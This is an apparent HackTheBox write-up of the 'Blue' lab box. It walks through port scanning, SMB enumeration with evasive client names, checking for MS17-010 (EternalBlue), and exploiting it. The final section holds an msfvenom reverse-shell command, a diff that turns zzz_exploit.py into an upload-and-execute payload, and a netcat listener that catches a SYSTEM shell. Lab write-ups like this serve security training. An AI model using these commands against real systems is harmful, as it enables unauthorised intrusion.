Table o' contents:

[Intro](#blue)

[Internet Presence](#internet-presence)

[Gateway](#gateway)

[Accessible Services](#accessible-services)

[Server Message Block](#server-message-block)

[The Shares](#the-shares)

[Disclosed System Information](#disclosed-system-information)

[Vulnerable OS Version](#vulnerable-os-version)

[Exploits](#exploits)

[pyenv Setup](#pyenv-setup)

[Running The Exploits](#running-the-exploits)


# Blue
**Blue** is an easy HackTheBox Windows box. Its simplicity lies in an SMBv1 service, vulnerable to the [EternalBlue](https://nordvpn.com/blog/what-is-eternalblue/) exploit. 

## Internet Presence
The spawned virtual machine is of ip address: "10.10.10.40".
I will save this value as a variable to be referenced with ease later.

```bash
ip="10.10.10.40"
```

The first thing I want to know is if the target responds to ICMP Echo messages, 
as it would confirm that the device is indeed online.

```bash
ping $ip -c 3
```
```
PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data.
64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=29.4 ms
64 bytes from 10.10.10.40: icmp_seq=2 ttl=127 time=33.7 ms
64 bytes from 10.10.10.40: icmp_seq=3 ttl=127 time=37.6 ms

--- 10.10.10.40 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 29.417/33.589/37.625/3.352 ms
```

The device is indeed online.

## Gateway
Thanks to [zekosec](https://www.zekosec.com/blog/port-discover-without-nmap/)!

I scan the top 1000 ports with netcat:

```bash
nc -nvv -w 3 -z $ip 1-1000 2>&1 | grep -v "Connection refused"
```
```bash
(UNKNOWN) [10.10.10.40] 445 (microsoft-ds) open
(UNKNOWN) [10.10.10.40] 139 (netbios-ssn) open
(UNKNOWN) [10.10.10.40] 135 (epmap) open
 sent 0, rcvd 0
```

I also check if other, higher ports are open:

```bash
nc -nvv -w 3 -z $ip 1-65535 2>&1 | grep -v "Connection refused"
```
```bash
(UNKNOWN) [10.10.10.40] 49157 (?) open
(UNKNOWN) [10.10.10.40] 49156 (?) open
(UNKNOWN) [10.10.10.40] 49155 (?) open
(UNKNOWN) [10.10.10.40] 49154 (?) open
(UNKNOWN) [10.10.10.40] 49153 (?) open
(UNKNOWN) [10.10.10.40] 49152 (?) open
...
```
The high, non-standard ports are probably used by internal applications.
Therefore we really have 3 open ports:
* 445 (SMB over TCP/IP)
* 139 (SMB over NetBIOS)
* 135 (Windows RPC)

## Accessible Services

### Server Message Block
In order to enumerate the SMB service hosted on the machine, we can utilize the SMB client CLI-app "smbclient" from samba.

SMB is a file sharing protocol, so our target should be in enumerating the shares:

```bash
smbclient --workgroup=MYWORKGROUP --user=MYUSERNAME --netbiosname=MYNETBIOSNAME --no-pass --list $ip -d 10 2> scans/smbclient/debug-share-listing.txt 
```
Here I explicitly define my workgroup, username and netbiosname, because samba by default fetches values from the hostname and username, which would be "kali"
leaving blatant traces of an attack.
I also made sure to extract as much debugging information from the conversation as possible, which will be very helpful later.

#### The Shares
Available shares:
```bash
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Share           Disk      
Users           Disk
```
```bash
...
[0000] 01 00 00 00 01 00 00 00   00 00 02 00 05 00 00 00   ........ ........
[0010] 04 00 02 00 05 00 00 00   08 00 02 00 00 00 00 80   ........ ........
[0020] 0C 00 02 00 10 00 02 00   00 00 00 80 14 00 02 00   ........ ........
[0030] 18 00 02 00 03 00 00 80   1C 00 02 00 20 00 02 00   ........ .... ...
[0040] 00 00 00 00 24 00 02 00   28 00 02 00 00 00 00 00   ....$... (.......
[0050] 2C 00 02 00 07 00 00 00   00 00 00 00 07 00 00 00   ,....... ........
[0060] 41 00 44 00 4D 00 49 00   4E 00 24 00 00 00 00 00   A.D.M.I. N.$.....
[0070] 0D 00 00 00 00 00 00 00   0D 00 00 00 52 00 65 00   ........ ....R.e.
[0080] 6D 00 6F 00 74 00 65 00   20 00 41 00 64 00 6D 00   m.o.t.e.  .A.d.m.
[0090] 69 00 6E 00 00 00 00 00   03 00 00 00 00 00 00 00   i.n..... ........
[00A0] 03 00 00 00 43 00 24 00   00 00 00 00 0E 00 00 00   ....C.$. ........
[00B0] 00 00 00 00 0E 00 00 00   44 00 65 00 66 00 61 00   ........ D.e.f.a.
[00C0] 75 00 6C 00 74 00 20 00   73 00 68 00 61 00 72 00   u.l.t. . s.h.a.r.
[00D0] 65 00 00 00 05 00 00 00   00 00 00 00 05 00 00 00   e....... ........
[00E0] 49 00 50 00 43 00 24 00   00 00 00 00 0B 00 00 00   I.P.C.$. ........
[00F0] 00 00 00 00 0B 00 00 00   52 00 65 00 6D 00 6F 00   ........ R.e.m.o.
[0100] 74 00 65 00 20 00 49 00   50 00 43 00 00 00 00 00   t.e. .I. P.C.....
[0110] 06 00 00 00 00 00 00 00   06 00 00 00 53 00 68 00   ........ ....S.h.
[0120] 61 00 72 00 65 00 00 00   01 00 00 00 00 00 00 00   a.r.e... ........
[0130] 01 00 00 00 00 00 00 00   06 00 00 00 00 00 00 00   ........ ........
[0140] 06 00 00 00 55 00 73 00   65 00 72 00 73 00 00 00   ....U.s. e.r.s...
[0150] 01 00 00 00 00 00 00 00   01 00 00 00 00 00 00 00   ........ ........
[0160] 05 00 00 00 30 00 02 00   00 00 00 00 00 00 00 00   ....0... ........
...

        out: struct srvsvc_NetShareEnumAll
            info_ctr                 : *
                info_ctr: struct srvsvc_NetShareInfoCtr
                    level                    : 0x00000001 (1)
                    ctr                      : union srvsvc_NetShareCtr(case 1)
                    ctr1                     : *
                        ctr1: struct srvsvc_NetShareCtr1
                            count                    : 0x00000005 (5)
                            array                    : *
                                array: ARRAY(5)
                                    array: struct srvsvc_NetShareInfo1
                                        name                     : *
                                            name                     : 'ADMIN$'
                                        type                     : STYPE_DISKTREE_HIDDEN (0x80000000)
                                        comment                  : *
                                            comment                  : 'Remote Admin'
                                    array: struct srvsvc_NetShareInfo1
                                        name                     : *
                                            name                     : 'C$'
                                        type                     : STYPE_DISKTREE_HIDDEN (0x80000000)
                                        comment                  : *
                                            comment                  : 'Default share'
                                    array: struct srvsvc_NetShareInfo1
                                        name                     : *
                                            name                     : 'IPC$'
                                        type                     : STYPE_IPC_HIDDEN (0x80000003)
                                        comment                  : *
                                            comment                  : 'Remote IPC'
                                    array: struct srvsvc_NetShareInfo1
                                        name                     : *
                                            name                     : 'Share'
                                        type                     : STYPE_DISKTREE (0x0)
                                        comment                  : *
                                            comment                  : ''
                                    array: struct srvsvc_NetShareInfo1
                                        name                     : *
                                            name                     : 'Users'
                                        type                     : STYPE_DISKTREE (0x0)
                                        comment                  : *
                                            comment                  : ''
            totalentries             : *
                totalentries             : 0x00000005 (5)
            resume_handle            : *
                resume_handle            : 0x00000000 (0)
            result                   : WERR_OK
```

We can now try to connect to these shares and enumerate the data they hold. I will refrain from that for now.

#### Disclosed System Information

```bash
TargetInfo               : *
    TargetInfo: struct AV_PAIR_LIST
        count                    : 0x00000006 (6)
        pair: ARRAY(6)
            pair: struct AV_PAIR
                AvId                     : MsvAvNbDomainName (0x2)
                AvLen                    : 0x0010 (16)
                Value                    : union ntlmssp_AvValue(case 0x2)
                AvNbDomainName           : 'HARIS-PC'
            pair: struct AV_PAIR
                AvId                     : MsvAvNbComputerName (0x1)
                AvLen                    : 0x0010 (16)
                Value                    : union ntlmssp_AvValue(case 0x1)
                AvNbComputerName         : 'HARIS-PC'
            pair: struct AV_PAIR
                AvId                     : MsvAvDnsDomainName (0x4)
                AvLen                    : 0x0010 (16)
                Value                    : union ntlmssp_AvValue(case 0x4)
                AvDnsDomainName          : 'haris-PC'
            pair: struct AV_PAIR
                AvId                     : MsvAvDnsComputerName (0x3)
                AvLen                    : 0x0010 (16)
                Value                    : union ntlmssp_AvValue(case 0x3)
                AvDnsComputerName        : 'haris-PC'
            pair: struct AV_PAIR
                AvId                     : MsvAvTimestamp (0x7)
                AvLen                    : 0x0008 (8)
                Value                    : union ntlmssp_AvValue(case 0x7)
                AvTimestamp              : Tue Aug 26 01:39:00 PM 2025 EDT
            pair: struct AV_PAIR
                AvId                     : MsvAvEOL (0x0)
                AvLen                    : 0x0000 (0)
                Value                    : union ntlmssp_AvValue(case 0x0)

```
```bash
Version: struct ntlmssp_VERSION
    ProductMajorVersion      : NTLMSSP_WINDOWS_MAJOR_VERSION_6 (0x6)
    ProductMinorVersion      : NTLMSSP_WINDOWS_MINOR_VERSION_1 (0x1)
    ProductBuild             : 0x1db1 (7601)
    Reserved                 : 000000
    NTLMRevisionCurrent      : NTLMSSP_REVISION_W2K3 (0xF)
```

From these two pieces of debugging info we see that the network name for the device is "haris-PC".
What is more important is the OS information - it is clear that the device is running Windows 6.1 .

BONUS: The hint that this is a Windows machine was embedded inside our [ping check][##internet-presence]. Windows OS is 
known to have the Time-To-Live packet value of 128 ( we saw 127 because of one middle device on the network).

## Vulnerable OS Version
Windows 6.1 ( more known by the name Windows 7 ) was one of the versions of Windows vulnerable to Eternal* exploits, like EternalBlue.
I will check whether the host is actually affected, or if it is patched.

### Exploits
The best exploits to use for Eternal* exploits are available [in worawit's repo](https://github.com/worawit/MS17-010]).
However, one massive problem with them is that they are no longer maintained to be compatible with the latest python version,
which makes them inusable for us without some previous setup:

```bash
python3.13 ./checker.py $ip
```
```bash
Target OS: Windows 7 Professional 7601 Service Pack 1
Traceback (most recent call last):
  File "/home/kali/Workspace/HackTheBox/Machines/Blue/tools/MS17-010/./checker.py", line 55, in <module>
    recvPkt = conn.send_trans(pack('<H', TRANS_PEEK_NMPIPE), maxParameterCount=0xffff, maxDataCount=0x800)
  File "/home/kali/Workspace/HackTheBox/Machines/Blue/tools/MS17-010/mysmb.py", line 262, in send_trans
    self.send_raw(self.create_trans_packet(setup, param, data, mid, maxSetupCount, totalParameterCount, totalDataCount, maxParameterCount, maxDataCount, pid, tid, noPad))
                  ~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/Workspace/HackTheBox/Machines/Blue/tools/MS17-010/mysmb.py", line 259, in create_trans_packet
    return self.create_smb_packet(transCmd, mid, pid, tid)
           ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/Workspace/HackTheBox/Machines/Blue/tools/MS17-010/mysmb.py", line 230, in create_smb_packet
    return '\x00'*2 + pack('>H', len(req)) + req  # assume length is <65536
           ~~~~~~~~~^~~~~~~~~~~~~~~~~~~~~~
TypeError: can only concatenate str (not "bytes") to str
```
Python 3.x differs significantly with Python 2.x, one of those diffrences is the prohibition of joining bytes and strings directly.

The best way to combat this is to create a separate Python virtual environment on our host and install the old python version there.
A good and easy way to do so is through [pyenv](https://github.com/pyenv/pyenv).


#### pyenv Setup
Installation:
```bash
curl -fsSL https://pyenv.run | bash
```

Dependencies:
```bash
sudo apt update; sudo apt install make build-essential libssl-dev zlib1g-dev \
libbz2-dev libreadline-dev libsqlite3-dev curl git \
libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev
```

Shell Configuration: 
```bash
export PYENV_ROOT="$HOME/.pyenv"
export PATH="$PYENV_ROOT/bin:$PATH"
eval "$(pyenv init - bash)"
```
(temporary, needs to be ran inside every shell to use)

Target Python Version Install:
```bash
pyenv install -l
pyenv install 2.7.18
pyenv versions
* system (set by /home/kali/.pyenv/version)
  2.7.18
```

Virtual environment creation:
```bash
pyenv virtualenv 2.7.18 worawit-eternalblue
pyenv virtualenvs 
  2.7.18/envs/worawit-eternalblue (created from /home/kali/.pyenv/versions/2.7.18)
  worawit-eternalblue (created from /home/kali/.pyenv/versions/2.7.18)
```

Environment activation:
```bash
pyenv activate worawit-eternalblue
python --version
	Python 2.7.18
pip --version
	pip 20.3.4 from /home/kali/.pyenv/versions/2.7.18/envs/worawit-eternalblue/lib/python2.7/site-packages/pip (python 2.7)
```

We now have an older version of python, which will allow us to run the scripts.
However, aside from python itself, the scripts also utilize impacket. Impacket is absent from our virtual environment:
```bash
python ./checker.py 
Traceback (most recent call last):
  File "./checker.py", line 1, in <module>
    from mysmb import MYSMB
  File "/home/kali/Workspace/HackTheBox/Machines/Blue/tools/MS17-010/mysmb.py", line 3, in <module>
    from impacket import smb, smbconnection
ImportError: No module named impacket
```

We need to install Impacket inside our virtual environment:
```bash
pip install impacket==0.9.22	# 0.9.24 relies on OpenSSL version incompatible with 2.7
python ./checker.py $ip
	Target OS: Windows 7 Professional 7601 Service Pack 1
	...
```

Everything is ready to go!

#### Running The Exploits
With my enviroment set up, I can return to testing the machine.
The "checker.py" script is used to check whether the machine is truly vulnerable to the CVE.
Inside the script, there are variables that hold the values of username and password we auth as:

```bash
USERNAME = ''
PASSWORD = ''
```

I will run the exploit with blank creds, as well as with probably invalid but not blank creds.

```bash
python ./checker.py $ip
```
```bash
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_ACCESS_DENIED
```

```bash
python ./checker-blankless-creds.py $ip
```
```bash
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_OBJECT_NAME_NOT_FOUND
samr: Ok (64 bit)
netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
lsarpc: Ok (64 bit)
browser: Ok (64 bit)
```

With blank credentials we get a much more restricted environment than with just invalid creds!
Anyways, I have now comfirmed that the device is not patched - it is vulnerable.

I will utilize [this tutorial](https://redteamzone.com/EternalBlue/) to gain a shell on the target:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=443 -f exe > shell.exe
```

```bash
diff zzz_exploit.py zzz_exploit-modified.py
```
```bash
34,35c34,35
< USERNAME = ''
< PASSWORD = ''
---
> USERNAME = '1'
> PASSWORD = '1'
973,985c973,975
<       smbConn = conn.get_smbconnection()
< 
<       print('creating file c:\\pwned.txt on the target')
<       tid2 = smbConn.connectTree('C$')
<       fid2 = smbConn.createFile(tid2, '/pwned.txt')
<       smbConn.closeFile(tid2, fid2)
<       smbConn.disconnectTree(tid2)
< 
<       #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
<       #service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
<       # Note: there are many methods to get shell over SMB admin session
<       # a simple method to get shell (but easily to be detected by AV) is
<       # executing binary generated by "msfvenom -f exe-service ..."
---
>     smbConn = conn.get_smbconnection()
>     smb_send_file(smbConn, 'shell.exe', 'C', '/test.exe')
>     service_exec(conn, r'c:\test.exe')
```

```bash
python ./zzz_exploit-modified.py $ip browser
```

```bash
nc -lvnp 443
```
```bash
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.40] 49171
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
